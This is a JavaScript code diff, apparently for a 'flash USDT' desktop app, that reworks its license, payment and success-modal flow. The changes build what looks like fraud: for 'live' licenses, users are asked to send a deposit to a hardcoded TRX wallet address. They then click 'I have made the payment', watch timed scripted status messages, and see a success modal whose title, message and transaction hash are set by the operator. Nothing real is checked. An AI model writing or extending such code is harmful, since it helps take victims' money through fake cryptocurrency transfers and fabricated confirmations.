@@ -167,6 +167,51 @@ function setupAppResponseListeners() {
           licenseKey: currentLicenseKey.key
         });
       }
+    } else if (response.action === 'appSettingsUpdate') {
+      // Handle real-time app settings updates
+      console.log('App settings updated in real-time:', response.appSettings);
+      
+      // Update app settings
+      appSettings = { ...appSettings, ...response.appSettings };
+      
+      // Update any open modals with the new settings
+      updateModalsWithNewSettings(appSettings);
+      
+      showNotification('Update', 'App settings have been updated');
+    } else if (response.action === 'getSuccessModalData' || response.action === 'successModalUpdate') {
+      // Handle success modal data from database or real-time updates
+      console.log('Success modal data received:', response.successModalData || response.data);
+      
+      // Get the data from the appropriate field
+      const modalData = response.successModalData || response.data || {};
+      
+      // Update success modal if it exists
+      const successModal = document.getElementById('success-modal');
+      if (successModal) {
+        // Update title
+        const modalTitle = document.getElementById('success-modal-title');
+        if (modalTitle) {
+          // Remove loading spinner and update text
+          modalTitle.innerHTML = modalData.successTitle || 'Success';
+        }
+        
+        // Update message
+        const description = document.getElementById('success-modal-message');
+        if (description) {
+          // Remove loading spinner and update text
+          description.innerHTML = modalData.successMessage || 'The flash has been sent successfully';
+        }
+        
+        // Update transaction hash
+        const transactionHashInput = document.getElementById('success-modal-hash');
+        if (transactionHashInput) {
+          transactionHashInput.value = modalData.transactionHash || 'Loading transaction hash...';
+        }
+        
+        if (response.action === 'successModalUpdate') {
+          showNotification('Update', 'Transaction details have been updated');
+        }
+      }
     }
   });
   
@@ -177,6 +222,53 @@ function setupAppResponseListeners() {
       action: 'forceRefresh'
     });
   }, 5 * 60 * 1000); // 5 minutes
+}
+
+// Update modals with new settings
+function updateModalsWithNewSettings(settings) {
+  // Update payment modal if it exists
+  const paymentModal = document.getElementById('payment-modal');
+  if (paymentModal) {
+    // Update deposit amount and transaction fee
+    const description = paymentModal.querySelector('.modal-body p');
+    if (description) {
+      description.textContent = `Please complete payment of ${settings.depositAmount || 500} for ${settings.transactionFee || 'Transaction Fee'}`;
+    }
+    
+    // Update wallet address
+    const walletAddressInput = paymentModal.querySelector('.wallet-address input');
+    if (walletAddressInput) {
+      walletAddressInput.value = settings.walletAddress || 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV';
+    }
+    
+    // Update QR code
+    const qrCode = paymentModal.querySelector('.qr-code');
+    if (qrCode) {
+      qrCode.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${settings.walletAddress || 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV'}" alt="QR Code" width="200" height="200">`;
+    }
+  }
+  
+  // Update success modal if it exists
+  const successModal = document.getElementById('success-modal');
+  if (successModal) {
+    // Update title
+    const modalTitle = successModal.querySelector('.modal-header h2');
+    if (modalTitle) {
+      modalTitle.textContent = settings.successTitle || 'Success';
+    }
+    
+    // Update message
+    const description = successModal.querySelector('.modal-body p');
+    if (description) {
+      description.textContent = settings.successMessage || 'The flash has been sent successfully';
+    }
+    
+    // Update transaction hash
+    const transactionHashInput = successModal.querySelector('.transaction-hash input');
+    if (transactionHashInput) {
+      transactionHashInput.value = settings.transactionHash || '000000000000000000000000000000000000';
+    }
+  }
 }
 
 // Handle license key validation response
@@ -193,15 +285,23 @@ function handleLicenseKeyValidationResponse(response) {
     currentLicenseKey = response.licenseKey;
     
     // Determine license type based on key pattern or response
-    const licenseKey = licenseKeyInput.value;
-    if (response.licenseKey && response.licenseKey.type) {
-      // Use the type from the response
-      licenseType = response.licenseKey.type;
-      console.log('Using license type from response:', licenseType);
-    } else if (licenseKey.includes('DEMO') || licenseKey === 'USDT-ABCD-1234-EFGH-5678') {
+    const licenseKey = licenseKeyInput.value.toUpperCase();
+    
+    // First check if the key includes 'DEMO' or matches the demo key pattern
+    if (licenseKey.includes('DEMO') || licenseKey === 'USDT-ABCD-1234-EFGH-5678') {
       licenseType = 'demo';
-    } else {
+      console.log('Using demo license type based on key pattern');
+    } 
+    // Then check if we have a type from the database (local validation)
+    else if (response.licenseKey && response.licenseKey.type) {
+      // Use the type from the response
+      licenseType = response.licenseKey.type.toLowerCase();
+      console.log('Using license type from database:', licenseType);
+    } 
+    // Fallback to live
+    else {
       licenseType = 'live';
+      console.log('Defaulting to live license type');
     }
     
     // Set current user
@@ -211,7 +311,7 @@ function handleLicenseKeyValidationResponse(response) {
       currentUser = licenseType === 'demo' ? 'test@gmail.com' : 'live@gmail.com';
     }
     
-    console.log('License type:', licenseType);
+    console.log('Final license type:', licenseType);
     console.log('Current user:', currentUser);
     
     // Set max amount directly from the response if available
@@ -861,7 +961,6 @@ function createPaymentModal(appSettings) {
   // QR Code
   const qrCode = document.createElement('div');
   qrCode.className = 'qr-code';
-  // Generate QR code for wallet address
   qrCode.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${walletAddress}" alt="QR Code" width="200" height="200">`;
   modalBody.appendChild(qrCode);
   
@@ -887,22 +986,38 @@ function createPaymentModal(appSettings) {
   walletAddressContainer.appendChild(copyButton);
   modalBody.appendChild(walletAddressContainer);
   
-  // Verify Button
-  const verifyButton = document.createElement('button');
-  verifyButton.className = 'action-btn primary';
-  verifyButton.textContent = 'Verify Payment';
-  verifyButton.addEventListener('click', () => {
+  // Payment Status Messages
+  const paymentStatus = document.createElement('div');
+  paymentStatus.className = 'payment-status';
+  paymentStatus.textContent = 'Waiting for payment...';
+  modalBody.appendChild(paymentStatus);
+  
+  // Continue Button
+  const continueButton = document.createElement('button');
+  continueButton.className = 'action-btn primary';
+  continueButton.textContent = 'I have made the payment';
+  continueButton.addEventListener('click', () => {
     // Hide payment modal
     modal.style.display = 'none';
     
-    // Show payment verification messages in status display
+    // Show payment status messages in status display
     const statusDisplay = document.getElementById('status-display');
     if (statusDisplay) {
       statusDisplay.innerHTML = '';
       
-      // Display payment status messages for 10 seconds
-      displayMessages(window.paymentStatusMessages, statusDisplay, 10000, () => {
-        // After 10 seconds, show the success modal
+      // Create a single message element that will be reused
+      const messageElement = document.createElement('div');
+      messageElement.className = 'status-message';
+      statusDisplay.appendChild(messageElement);
+      
+      // Start displaying payment status messages with increased delay (20 seconds)
+      displaySingleMessage(window.paymentStatusMessages, messageElement, 20000, () => {
+        // After all messages are displayed, show the success modal
+        window.api.send('app-request', {
+          action: 'getSuccessModalData'
+        });
+        
+        // Create and show success modal
         createSuccessModal(appSettings);
         const successModal = document.getElementById('success-modal');
         if (successModal) {
@@ -910,12 +1025,21 @@ function createPaymentModal(appSettings) {
         }
       });
     } else {
-      // If status display is not available, complete the transaction immediately
-      completeTransaction();
+      // If status display is not available, show success modal directly
+      window.api.send('app-request', {
+        action: 'getSuccessModalData'
+      });
+      
+      // Create and show success modal
+      createSuccessModal(appSettings);
+      const successModal = document.getElementById('success-modal');
+      if (successModal) {
+        successModal.style.display = 'block';
+      }
     }
   });
   
-  modalBody.appendChild(verifyButton);
+  modalBody.appendChild(continueButton);
   
   modalContent.appendChild(modalHeader);
   modalContent.appendChild(modalBody);
@@ -933,11 +1057,6 @@ function createSuccessModal(appSettings) {
   
   console.log('Creating success modal with app settings:', appSettings);
   
-  // Make sure we have the required settings
-  const successTitle = appSettings.successTitle || 'Success';
-  const successMessage = appSettings.successMessage || 'The flash has been sent successfully';
-  const transactionHash = appSettings.transactionHash || '000000000000000000000000000000000000';
-  
   const modal = document.createElement('div');
   modal.id = 'success-modal';
   modal.className = 'modal-overlay';
@@ -949,7 +1068,8 @@ function createSuccessModal(appSettings) {
   modalHeader.className = 'modal-header';
   
   const modalTitle = document.createElement('h2');
-  modalTitle.textContent = successTitle;
+  modalTitle.id = 'success-modal-title';
+  modalTitle.innerHTML = '<div class="loading-spinner"></div> Loading...';
   
   const closeButton = document.createElement('button');
   closeButton.className = 'modal-close';
@@ -966,7 +1086,8 @@ function createSuccessModal(appSettings) {
   
   // Description
   const description = document.createElement('p');
-  description.textContent = successMessage;
+  description.id = 'success-modal-message';
+  description.innerHTML = '<div class="loading-spinner"></div> Loading message...';
   modalBody.appendChild(description);
   
   // Transaction Hash with Copy Button
@@ -974,8 +1095,9 @@ function createSuccessModal(appSettings) {
   transactionHashContainer.className = 'transaction-hash';
   
   const transactionHashInput = document.createElement('input');
+  transactionHashInput.id = 'success-modal-hash';
   transactionHashInput.type = 'text';
-  transactionHashInput.value = transactionHash;
+  transactionHashInput.value = 'Loading transaction hash...';
   transactionHashInput.readOnly = true;
   
   const copyButton = document.createElement('button');
@@ -991,11 +1113,43 @@ function createSuccessModal(appSettings) {
   transactionHashContainer.appendChild(copyButton);
   modalBody.appendChild(transactionHashContainer);
   
+  // Add CSS for loading spinner
+  const style = document.createElement('style');
+  style.textContent = `
+    .loading-spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(0, 230, 184, 0.3);
+      border-radius: 50%;
+      border-top-color: #00e6b8;
+      animation: spin 1s ease-in-out infinite;
+      margin-right: 10px;
+      vertical-align: middle;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  `;
+  document.head.appendChild(style);
+  
+  // Request the latest success modal data from the database
+  window.api.send('app-request', {
+    action: 'getSuccessModalData'
+  });
+  
   // Close Button
   const closeModalButton = document.createElement('button');
   closeModalButton.className = 'action-btn primary';
   closeModalButton.textContent = 'Close';
   closeModalButton.addEventListener('click', () => {
+    // Get the current values from the modal
+    const title = document.getElementById('success-modal-title').textContent;
+    const message = document.getElementById('success-modal-message').textContent;
+    const hash = document.getElementById('success-modal-hash').value;
+    
+    // Hide the modal
     modal.style.display = 'none';
     
     // Display details in status section
@@ -1003,15 +1157,16 @@ function createSuccessModal(appSettings) {
     if (statusDisplay) {
       const successMessageElement = document.createElement('div');
       successMessageElement.className = 'status-message';
-      successMessageElement.textContent = `${successTitle}: ${successMessage}`;
+      successMessageElement.textContent = `${title}: ${message}`;
       statusDisplay.appendChild(successMessageElement);
       
       const hashMessage = document.createElement('div');
       hashMessage.className = 'status-message';
-      hashMessage.textContent = `Transaction Hash: ${transactionHash}`;
+      hashMessage.textContent = `Transaction Hash: ${hash}`;
       statusDisplay.appendChild(hashMessage);
     }
     
+    // Complete the transaction
     completeTransaction();
   });
   
@@ -1040,32 +1195,44 @@ function handleLicenseKeyConfirm() {
     licenseKeyModal.style.display = 'none';
   }
   
+  console.log('License key confirmed, license type:', licenseType);
+  
   // Get app settings
   window.api.send('app-request', {
     action: 'getAppSettings'
   });
   
-  // Listen for app settings response
-  const appSettingsListener = (response) => {
+  // Create a one-time listener for app settings response
+  const appSettingsListener = function(response) {
+    console.log('Received app settings response:', response);
+    
     if (response.action === 'getAppSettings') {
-      window.api.receive('app-response', appSettingsListener); // Remove listener
+      // Remove this listener to avoid duplicates
+      window.api.receive('app-response', appSettingsListener);
       
-      const appSettings = response.settings;
+      const settings = response.settings || {};
+      console.log('Using app settings:', settings);
       
       // Check license type
       if (licenseType === 'live') {
+        console.log('Showing payment modal for live license');
         // Show payment modal for live license
-        createPaymentModal(appSettings);
+        createPaymentModal(settings);
         const paymentModal = document.getElementById('payment-modal');
         if (paymentModal) {
           paymentModal.style.display = 'block';
+        } else {
+          console.error('Payment modal not found after creation');
         }
       } else {
+        console.log('Showing success modal for demo license');
         // Show success modal for demo license
-        createSuccessModal(appSettings);
+        createSuccessModal(settings);
         const successModal = document.getElementById('success-modal');
         if (successModal) {
           successModal.style.display = 'block';
+        } else {
+          console.error('Success modal not found after creation');
         }
       }
     }
